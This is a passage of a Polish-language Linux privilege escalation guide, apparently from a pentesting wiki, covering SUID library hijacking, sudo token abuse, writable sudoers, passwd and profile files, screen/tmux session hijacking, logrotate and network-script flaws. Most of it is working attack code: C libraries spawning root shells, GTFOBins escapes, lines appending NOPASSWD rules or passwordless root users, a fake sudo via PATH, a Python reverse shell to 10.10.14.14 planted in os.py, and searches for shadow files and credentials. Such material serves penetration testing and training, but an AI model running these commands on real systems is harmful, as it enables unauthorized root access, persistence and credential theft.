W końcu uruchomienie dotkniętego SUID binary powinno wywołać exploit, umożliwiając potencjalne przejęcie systemu.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Teraz, gdy znaleźliśmy SUID binary, który ładuje bibliotekę z folderu, do którego możemy zapisywać, stwórzmy tę bibliotekę w tym folderze pod wymaganą nazwą:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli otrzymasz błąd taki jak
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to oznacza, że wygenerowana biblioteka musi zawierać funkcję nazwaną `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. [**GTFOArgs**](https://gtfoargs.github.io/) is the same but for cases where you can **only inject arguments** in a command.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Jeśli masz dostęp do `sudo -l`, możesz użyć narzędzia [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), aby sprawdzić, czy znajdzie sposób na wykorzystanie jakiejkolwiek reguły sudo.

### Ponowne użycie tokenów sudo

W przypadkach, gdy masz **sudo access**, ale nie znasz hasła, możesz eskalować uprawnienia, **czekając na wykonanie polecenia sudo, a następnie przejmując token sesji**.

Wymagania do eskalacji uprawnień:

- Masz już powłokę jako użytkownik "_sampleuser_"
- "_sampleuser_" użył **`sudo`** do wykonania czegoś w **ostatnich 15 minutach** (domyślnie to czas trwania tokena sudo, który pozwala używać `sudo` bez podawania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` ma wartość 0
- `gdb` jest dostępny (możesz go przesłać)

(Możesz tymczasowo włączyć `ptrace_scope` poleceniem `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub trwale modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

Jeśli wszystkie te warunki są spełnione, **możesz eskalować uprawnienia używając:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Pierwszy exploit (`exploit.sh`) utworzy binarkę `activate_sudo_token` w _/tmp_. Możesz jej użyć, aby **aktywować token sudo w swojej sesji** (nie otrzymasz automatycznie powłoki root, użyj `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **drugi exploit** (`exploit_v2.sh`) utworzy sh shell w _/tmp_ **należący do root z setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Trzeci exploit** (`exploit_v3.sh`) **utworzy sudoers file**, który sprawi, że **sudo tokens będą wieczne i pozwoli wszystkim użytkownikom używać sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Jeśli masz **write permissions** w folderze lub na którymkolwiek z plików utworzonych wewnątrz tego folderu, możesz użyć binarki [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) aby **create a sudo token for a user and PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz shell jako ten użytkownik z PID 1234, możesz **obtain sudo privileges** bez konieczności znajomości hasła wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` oraz pliki w katalogu `/etc/sudoers.d` konfigurują, kto może używać `sudo` i w jaki sposób. Te pliki **domyślnie mogą być odczytywane tylko przez użytkownika root i grupę root**.\
**Jeśli** możesz ten plik **odczytać**, możesz być w stanie **uzyskać pewne interesujące informacje**, a jeśli możesz **zapisać** którykolwiek z tych plików, będziesz w stanie **eskalować uprawnienia**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli możesz zapisywać, możesz nadużyć tego uprawnienia.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób nadużycia tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją pewne alternatywy dla binarki `sudo`, takie jak `doas` dla OpenBSD — pamiętaj, aby sprawdzić jego konfigurację w `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Jeśli wiesz, że **user zwykle łączy się z maszyną i używa `sudo`** do eskalacji uprawnień i uzyskałeś shell w kontekście tego usera, możesz **stworzyć nowy plik wykonywalny sudo**, który uruchomi twój kod jako root, a następnie polecenie usera. Następnie **zmodyfikuj $PATH** w kontekście usera (na przykład dodając nową ścieżkę w .bash_profile), tak aby gdy user uruchomi sudo, uruchomiony został twój plik wykonywalny sudo.

Zwróć uwagę, że jeśli user używa innego shell (nie bash) będziesz musiał zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Możesz znaleźć inny przykład w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Albo uruchamiając coś takiego:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje, **skąd pochodzą ładowane pliki konfiguracyjne**. Zazwyczaj ten plik zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

Oznacza to, że pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf` zostaną odczytane. Te pliki konfiguracyjne **wskazują na inne foldery**, w których będą **wyszukiwane biblioteki**. Na przykład zawartość `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **To oznacza, że system będzie szukał bibliotek w katalogu `/usr/local/lib`**.

Jeżeli z jakiegoś powodu **użytkownik ma prawa zapisu** do którejkolwiek z wymienionych ścieżek: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, dowolnego pliku w `/etc/ld.so.conf.d/` lub dowolnego katalogu wskazanego w plikach konfiguracyjnych `/etc/ld.so.conf.d/*.conf` może on być w stanie escalate privileges.\
Zobacz **how to exploit this misconfiguration** na następującej stronie:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiując bibliotekę do `/var/tmp/flag15/`, zostanie ona użyta przez program w tym miejscu, zgodnie z wartością zmiennej `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities zapewniają **podzbiór dostępnych uprawnień root dla procesu**. Dzięki temu uprawnienia root są podzielone na **mniejsze i odrębne jednostki**. Każdą z tych jednostek można następnie niezależnie przydzielać procesom. W ten sposób pełen zestaw uprawnień jest zredukowany, co zmniejsza ryzyko wykorzystania.\
Przeczytaj następującą stronę, aby **dowiedzieć się więcej o capabilities i jak je nadużywać**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

W katalogu, **bit "execute"** oznacza, że dany użytkownik może **cd** do folderu.\
Bit **"read"** oznacza, że użytkownik może **list** **pliki**, a bit **"write"** oznacza, że użytkownik może **usuwać** i **tworzyć** nowe **pliki**.

## ACLs

Access Control Lists (ACLs) stanowią drugą warstwę uprawnień dyskrecjonalnych, zdolną do **nadpisywania tradycyjnych uprawnień ugo/rwx**. Uprawnienia te zwiększają kontrolę dostępu do plików lub katalogów przez przyznawanie lub odmawianie praw konkretnym użytkownikom, którzy nie są właścicielami ani członkami grupy. Ten poziom **szczegółowości zapewnia precyzyjniejsze zarządzanie dostępem**. Dalsze szczegóły można znaleźć [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki z określonymi ACL-ami z systemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Ukryty backdoor ACL w sudoers drop-ins

Typowa błędna konfiguracja to plik należący do roota w `/etc/sudoers.d/` z trybem `440`, który jednak nadal przyznaje write access użytkownikowi low-priv za pomocą ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Jeśli zobaczysz coś takiego jak `user:alice:rw-`, użytkownik może dodać regułę sudo mimo restrykcyjnych bitów trybu:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
To jest ścieżka ACL persistence/privesc o dużym wpływie, ponieważ łatwo ją przeoczyć podczas przeglądów opartych wyłącznie na `ls -l`.

## Otwarte shell sessions

W **starszych wersjach** możesz **hijack** sesję **shell** innego użytkownika (**root**).\
W **najnowszych wersjach** będziesz mógł **połączyć się** z sesjami screen jedynie swojego użytkownika. Jednak możesz znaleźć **interesujące informacje wewnątrz sesji**.

### screen sessions hijacking

**Wyświetl screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Dołącz do sesji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

To był problem ze **starymi wersjami tmux**. Nie udało mi się przejąć sesji tmux (v2.1) utworzonej przez root jako użytkownik bez uprawnień.

**Wyświetl sesje tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Dołącz do sesji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** dla przykładu.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Wszystkie klucze SSL i SSH wygenerowane na systemach opartych na Debianie (Ubuntu, Kubuntu, itp.) między wrześniem 2006 a 13 maja 2008 mogą być dotknięte tym błędem.\
Błąd występuje przy tworzeniu nowego ssh key w tych systemach, ponieważ **możliwe były tylko 32,768 warianty**. Oznacza to, że wszystkie możliwości można obliczyć i **mając ssh public key możesz wyszukać odpowiadający private key**. Możesz znaleźć obliczone możliwości tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesujące wartości konfiguracyjne

- **PasswordAuthentication:** Określa, czy uwierzytelnianie hasłem jest dozwolone. Domyślnie `no`.
- **PubkeyAuthentication:** Określa, czy uwierzytelnianie za pomocą public key jest dozwolone. Domyślnie `yes`.
- **PermitEmptyPasswords**: Jeśli uwierzytelnianie hasłem jest dozwolone, określa, czy serwer pozwala na logowanie do kont z pustymi hasłami. Domyślnie `no`.

### Login control files

Te pliki wpływają na to, kto i jak może się logować:

- **`/etc/nologin`**: jeśli obecny, blokuje logowania nie-rootów i wyświetla swoją wiadomość.
- **`/etc/securetty`**: ogranicza miejsca, z których root może się logować (TTY allowlist).
- **`/etc/motd`**: post-login banner (can leak environment or maintenance details).

### PermitRootLogin

Określa, czy root może logować się przez ssh, domyślnie `no`. Możliwe wartości:

- `yes`: root może się zalogować używając hasła i private key
- `without-password` or `prohibit-password`: root może się logować tylko za pomocą private key
- `forced-commands-only`: Root może się zalogować tylko używając private key i jeśli the commands options są określone
- `no` : nie

### AuthorizedKeysFile

Określa pliki zawierające public keys, które mogą być użyte do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Możesz wskazać ścieżki bezwzględne** (rozpoczynające się od `/`) lub **ścieżki względne względem katalogu domowego użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracja oznacza, że jeśli spróbujesz zalogować się za pomocą **prywatnego** klucza użytkownika "**testusername**", ssh porówna klucz publiczny Twojego klucza z tymi znajdującymi się w `/home/testusername/.ssh/authorized_keys` oraz `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding pozwala Ci **używać lokalnych SSH keys zamiast zostawiać keys** (bez passphrases!) na Twoim serwerze. Dzięki temu będziesz mógł **przeskakiwać** przez ssh **na hosta** i stamtąd **przeskoczyć na inny** host **używając** **klucza** znajdującego się na Twoim **hostie początkowym**.

Musisz ustawić tę opcję w `$HOME/.ssh.config` w następujący sposób:
```
Host example.com
ForwardAgent yes
```
Zauważ, że jeśli `Host` jest `*`, za każdym razem gdy użytkownik przełączy się na inną maszynę, ten host będzie mógł uzyskać dostęp do kluczy (co stanowi problem bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisać** te **opcje** i pozwolić lub zablokować tę konfigurację.\  
Plik `/etc/sshd_config` może **zezwalać** lub **zabraniać** ssh-agent forwarding przy użyciu słowa kluczowego `AllowAgentForwarding` (domyślnie zezwolone).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesujące pliki

### Pliki profili

Plik `/etc/profile` oraz pliki w katalogu `/etc/profile.d/` to **skrypty, które są uruchamiane, gdy użytkownik otwiera nowy shell**. W związku z tym, jeśli możesz **zapisać lub zmodyfikować którykolwiek z nich, możesz eskalować uprawnienia**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Jeśli zostanie znaleziony jakiś dziwny skrypt profilowy, powinieneś sprawdzić go pod kątem **wrażliwych informacji**.

### Pliki passwd/shadow

W zależności od systemu operacyjnego pliki `/etc/passwd` i `/etc/shadow` mogą mieć inną nazwę lub może istnieć kopia zapasowa. Dlatego zaleca się **znaleźć wszystkie** i **sprawdzić, czy możesz je odczytać**, aby zobaczyć **czy w plikach znajdują się hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych przypadkach można znaleźć **password hashes** wewnątrz pliku `/etc/passwd` (lub równoważnego)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Zapisywalny /etc/passwd

Najpierw wygeneruj hasło za pomocą jednej z następujących komend.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Następnie dodaj użytkownika `hacker` i dodaj wygenerowane hasło.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Np.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Możesz teraz użyć polecenia `su` z `hacker:hacker`

Alternatywnie, możesz użyć poniższych linii, aby dodać użytkownika testowego bez hasła.\ UWAGA: możesz obniżyć aktualne bezpieczeństwo maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
UWAGA: Na platformach BSD plik `/etc/passwd` znajduje się pod `/etc/pwd.db` i `/etc/master.passwd`, a także `/etc/shadow` został przemianowany na `/etc/spwd.db`.

Powinieneś sprawdzić, czy możesz **zapisać do niektórych wrażliwych plików**. Na przykład, czy możesz zapisać do jakiegoś **pliku konfiguracyjnego usługi**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli maszyna uruchamia serwer **tomcat** i możesz **zmodyfikować plik konfiguracji usługi Tomcat w /etc/systemd/,** to możesz zmodyfikować linie:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Twój backdoor zostanie wykonany następnym razem, gdy tomcat zostanie uruchomiony.

### Sprawdź foldery

Następujące foldery mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać tego ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Nietypowa lokalizacja/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Zmodyfikowane pliki w ciągu ostatnich minut
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB pliki
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml pliki
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrypty/binaria w PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Pliki webowe**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające hasła

Przeczytaj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), który wyszukuje **wiele plików, które mogą zawierać hasła**.\
**Innym ciekawym narzędziem**, którego możesz użyć do tego, jest: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — aplikacja open-source służąca do odzyskiwania wielu haseł przechowywanych na lokalnym komputerze dla Windows, Linux i Mac.

### Logi

Jeśli potrafisz czytać logi, możesz znaleźć **interesujące/poufne informacje w nich zawarte**. Im dziwniejszy log, tym prawdopodobnie bardziej będzie interesujący.\
Ponadto, niektóre "**źle**" skonfigurowane (backdoored?) **logi audytu** mogą pozwolić na **zapis haseł** w logach audytu, jak wyjaśniono w tym wpisie: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby móc **czytać logi**, bardzo przydatna będzie grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group).

### Pliki powłoki
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Powinieneś także sprawdzić pliki zawierające słowo "**password**" w **nazwie** lub w **zawartości**, a także sprawdzić IPs i emails w logach, lub regexps dla hashy.\
Nie będę tutaj opisywać, jak to wszystko zrobić, ale jeśli jesteś zainteresowany, możesz sprawdzić ostatnie sprawdzenia, które wykonuje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki zapisywalne

### Python library hijacking

Jeśli wiesz, **skąd** będzie wykonywany skrypt python i **możesz zapisać w** tym folderze lub możesz **modify python libraries**, możesz zmodyfikować bibliotekę OS i backdoor it (jeśli możesz zapisać tam, gdzie skrypt python będzie wykonywany, skopiuj i wklej bibliotekę os.py).

Aby **backdoor the library** wystarczy dodać na końcu biblioteki os.py następującą linię (zmień IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Eksploatacja logrotate

Luka w `logrotate` pozwala użytkownikom z **write permissions** do pliku logu lub jego katalogów nadrzędnych potencjalnie uzyskać eskalację uprawnień. Dzieje się tak, ponieważ `logrotate`, często uruchamiany jako **root**, może być zmanipulowany do wykonania dowolnych plików, szczególnie w katalogach takich jak _**/etc/bash_completion.d/**_. Ważne jest sprawdzenie uprawnień nie tylko w _/var/log_, ale także w każdym katalogu, gdzie stosowana jest rotacja logów.

> [!TIP]
> Ta podatność dotyczy `logrotate` w wersji `3.18.0` i starszych

Bardziej szczegółowe informacje o podatności można znaleźć na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Możesz exploitować tę lukę za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta podatność jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** więc zawsze gdy możesz modyfikować logi, sprawdź, kto nimi zarządza i czy możesz eskalować uprawnienia, podstawiając logi za pomocą symlinków.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Źródło podatności:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Jeśli z jakiegoś powodu użytkownik jest w stanie **write** skrypt `ifcf-<whatever>` do _/etc/sysconfig/network-scripts_ **lub** może **adjust** istniejącego, to twój **system is pwned**.

Network scripts, _ifcg-eth0_ na przykład są używane do połączeń sieciowych. Wyglądają dokładnie jak pliki .INI. Jednak są one \~sourced\~ na Linux przez Network Manager (dispatcher.d).

W moim przypadku atrybut `NAME=` w tych skryptach sieciowych nie jest obsługiwany poprawnie. Jeśli w NAME masz **white/blank space in the name the system tries to execute the part after the white/blank space**. To oznacza, że **everything after the first blank space is executed as root**.

Na przykład: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Zauważ spację między Network i /bin/id_)

### **init, init.d, systemd, and rc.d**

Katalog `/etc/init.d` zawiera **skrypty** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami w Linuksie**. Zawiera skrypty do `start`, `stop`, `restart`, a czasem `reload` usług. Mogą być uruchamiane bezpośrednio lub przez dowiązania symboliczne znajdujące się w `/etc/rc?.d/`. Alternatywna ścieżka w systemach Redhat to `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest związany z **Upstart**, nowszym **systemem zarządzania usługami** wprowadzonym przez Ubuntu, używającym plików konfiguracyjnych do zadań związanych z zarządzaniem usługami. Pomimo przejścia na Upstart, skrypty SysVinit są nadal używane obok konfiguracji Upstart ze względu na warstwę kompatybilności w Upstart.

**systemd** pojawia się jako nowoczesny menedżer inicjalizacji i usług, oferując zaawansowane funkcje takie jak uruchamianie daemonów na żądanie, zarządzanie automount oraz migawki stanu systemu. Organizuje pliki w `/usr/lib/systemd/` dla pakietów dystrybucyjnych oraz `/etc/systemd/system/` dla modyfikacji administratora, upraszczając proces administracji systemem.

## Inne sztuczki

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks często hookują syscall, aby udostępnić uprzywilejowaną funkcjonalność jądra menedżerowi w userspace. Słaba autoryzacja menedżera (np. sprawdzenia podpisów oparte na FD-order lub słabe schematy haseł) może pozwolić lokalnej appce podszyć się pod menedżera i eskalować do root na już-rootowanych urządzeniach. Dowiedz się więcej i zobacz szczegóły eksploatacji tutaj:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery w VMware Tools/Aria Operations może wydobyć ścieżkę do binarki z linii poleceń procesu i wykonać ją z parametrem -v w uprzywilejowanym kontekście. Permisywne wzorce (np. używające \S) mogą dopasować attacker-staged listeners w zapisywalnych lokalizacjach (np. /tmp/httpd), prowadząc do wykonania jako root (CWE-426 Untrusted Search Path).

Dowiedz się więcej i zobacz uogólniony wzorzec zastosowalny dla innych stosów discovery/monitoringu tutaj:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Mechanizmy zabezpieczeń jądra

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Więcej pomocy

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Najlepsze narzędzie do wyszukiwania lokalnych wektorów privilege escalation dla Linuksa:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
